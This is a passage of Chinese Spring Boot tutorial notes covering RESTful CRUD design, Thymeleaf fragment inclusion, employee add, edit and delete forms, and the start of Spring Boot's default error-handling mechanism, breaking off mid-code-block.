HTTP请求方式区分对资源CRUD操作</p><table><thead><tr><th></th><th>普通CRUD（uri来区分操作）</th><th>RestfulCRUD</th></tr></thead><tbody><tr><td>查询</td><td>getEmp</td><td>emp—GET</td></tr><tr><td>添加</td><td>addEmp?xxx</td><td>emp—POST</td></tr><tr><td>修改</td><td>updateEmp?id=xxx&amp;xxx=xx</td><td>emp/{id}—PUT</td></tr><tr><td>删除</td><td>deleteEmp?id=1</td><td>emp/{id}—DELETE</td></tr></tbody></table><p>2）、实验的请求架构;</p><table><thead><tr><th>实验功能</th><th>请求URI</th><th>请求方式</th></tr></thead><tbody><tr><td>查询所有员工</td><td>emps</td><td>GET</td></tr><tr><td>查询某个员工(来到修改页面)</td><td>emp/1</td><td>GET</td></tr><tr><td>来到添加页面</td><td>emp</td><td>GET</td></tr><tr><td>添加员工</td><td>emp</td><td>POST</td></tr><tr><td>来到修改页面（查出员工进行信息回显）</td><td>emp/1</td><td>GET</td></tr><tr><td>修改员工</td><td>emp</td><td>PUT</td></tr><tr><td>删除员工</td><td>emp/1</td><td>DELETE</td></tr></tbody></table><p>3）、员工列表：</p><h4><span id="thymeleaf公共页面元素抽取">thymeleaf公共页面元素抽取</span></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、抽取公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">2、引入公共片段</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"~&#123;footer :: copy&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">~&#123;templatename::selector&#125;：模板名::选择器</span><br><span class="line">~&#123;templatename::fragmentname&#125;:模板名::片段名</span><br><span class="line"></span><br><span class="line">3、默认效果：</span><br><span class="line">insert的公共片段在div标签中</span><br><span class="line">如果使用th:insert等属性进行引入，可以不用写~&#123;&#125;：</span><br><span class="line">行内写法可以加上：[[~&#123;&#125;]];[(~&#123;&#125;)]；</span><br></pre></td></tr></table></figure><p>三种引入公共片段的th属性：</p><p><strong>th:insert</strong>：将公共片段整个插入到声明引入的元素中</p><p><strong>th:replace</strong>：将声明引入的元素替换为公共片段</p><p><strong>th:include</strong>：将被引入的片段的内容包含进这个标签中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">footer</span> <span class="attr">th:fragment</span>=<span class="string">"copy"</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">引入方式</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:insert</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:include</span>=<span class="string">"footer :: copy"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">效果</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line">    <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;copy;</span> 2011 The Good Thymes Virtual Grocery</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>引入片段的时候传入参数： </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"col-md-2 d-none d-md-block bg-light sidebar"</span> <span class="attr">id</span>=<span class="string">"sidebar"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"sidebar-sticky"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav flex-column"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">th:class</span>=<span class="string">"$&#123;activeUri=='main.html'?'nav-link active':'nav-link'&#125;"</span></span></span><br><span class="line"><span class="tag">                   <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/main.html&#125;"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"24"</span> <span class="attr">height</span>=<span class="string">"24"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 24 24"</span> <span class="attr">fill</span>=<span class="string">"none"</span> <span class="attr">stroke</span>=<span class="string">"currentColor"</span> <span class="attr">stroke-width</span>=<span class="string">"2"</span> <span class="attr">stroke-linecap</span>=<span class="string">"round"</span> <span class="attr">stroke-linejoin</span>=<span class="string">"round"</span> <span class="attr">class</span>=<span class="string">"feather feather-home"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">"M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">"9 22 9 12 15 12 15 22"</span>&gt;</span><span class="tag">&lt;/<span class="name">polyline</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">                    Dashboard <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>(current)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--引入侧边栏;传入参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:replace</span>=<span class="string">"commons/bar::#sidebar(activeUri='emps')"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="6-crud-员工添加">6）、CRUD-员工添加</span></h3><p>添加页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span>  <span class="attr">value</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>2<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>3<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>4<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>5<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>提交的数据格式不对：生日：日期；</p><p>2017-12-12；2017/12/12；2017.12.12；</p><p>日期的格式化；SpringMVC将页面提交的值需要转换为指定的类型;</p><p>2017-12-12—Date； 类型转换，格式化;</p><p>默认日期是按照/的方式；</p><h3><span id="7-crud-员工修改">7）、CRUD-员工修改</span></h3><p>修改添加二合一表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--需要区分是员工修改还是添加；--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">"@&#123;/emp&#125;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--发送put请求修改员工数据--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）</span></span><br><span class="line"><span class="comment">2、页面创建一个post表单</span></span><br><span class="line"><span class="comment">3、创建一个input项，name="_method";值就是我们指定的请求方式</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"_method"</span> <span class="attr">value</span>=<span class="string">"put"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;emp!=null&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">th:if</span>=<span class="string">"$&#123;emp!=null&#125;"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp.id&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>LastName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"lastName"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.lastName&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan@atguigu.com"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.email&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"1"</span> <span class="attr">th:checked</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.gender==1&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-check form-check-inline"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-check-input"</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">value</span>=<span class="string">"0"</span> <span class="attr">th:checked</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;emp.gender==0&#125;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"form-check-label"</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>department<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--提交的是部门的id--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"department.id"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">th:selected</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;dept.id == emp.department.id&#125;"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;dept.id&#125;"</span> <span class="attr">th:each</span>=<span class="string">"dept:$&#123;depts&#125;"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;dept.departmentName&#125;"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Birth<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"birth"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"zhangsan"</span> <span class="attr">th:value</span>=<span class="string">"$&#123;emp!=null&#125;?$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp!=null&#125;?'修改':'添加'"</span>&gt;</span>添加<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3><span id="8-crud-员工删除">8）、CRUD-员工删除</span></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">"emp:$&#123;emps&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.id&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span>[[$&#123;emp.lastName&#125;]]<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.email&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.gender&#125;==0?'女':'男'"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;emp.department.departmentName&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">"$&#123;#dates.format(emp.birth, 'yyyy-MM-dd HH:mm')&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-primary"</span> <span class="attr">th:href</span>=<span class="string">"@&#123;/emp/&#125;+$&#123;emp.id&#125;"</span>&gt;</span>编辑<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">th:attr</span>=<span class="string">"del_uri=@&#123;/emp/&#125;+$&#123;emp.id&#125;"</span> <span class="attr">class</span>=<span class="string">"btn btn-sm btn-danger deleteBtn"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">".deleteBtn"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//删除当前员工的</span></span></span><br><span class="line"><span class="javascript">        $(<span class="string">"#deleteEmpForm"</span>).attr(<span class="string">"action"</span>,$(<span class="keyword">this</span>).attr(<span class="string">"del_uri"</span>)).submit();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2><span id="7-错误处理机制">7、错误处理机制</span></h2><h3><span id="1-springboot默认的错误处理机制">1）、SpringBoot默认的错误处理机制</span></h3><p>默认效果：</p><p>​        1）、浏览器，返回一个默认的错误页面</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226173408.png" alt></p><p>  浏览器发送请求的请求头：</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180347.png" alt></p><p>​        2）、如果是其他客户端，默认响应一个json数据</p><p><img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226173527.png" alt></p><p>​        <img src="%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180226180504.png" alt></p><p>原理：</p><p>​    可以参照ErrorMvcAutoConfiguration；错误处理的自动配置；</p><pre><code>给容器中添加了以下组件</code></pre><p>​    1、DefaultErrorAttributes：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">帮我们在页面共享信息；</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getErrorAttributes</span><span class="params">(RequestAttributes requestAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">boolean</span> includeStackTrace)</span> </span>&#123;</span><br><span class="line">Map&lt;String, Object&gt; errorAttributes = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;();</span><br><span class="line">errorAttributes.put(<span class="string">"timestamp"</span>, <span class="keyword">new</span> Date());</span><br><span class="line">addStatus(errorAttributes, requestAttributes);</span><br><span class="line">addErrorDetails(errorAttributes, requestAttributes, includeStackTrace);</span><br><span class="line">addPath(errorAttributes, requestAttributes);</span><br><span class="line"><span class="keyword">return</span> errorAttributes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    2、BasicErrorController：处理默认/error请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 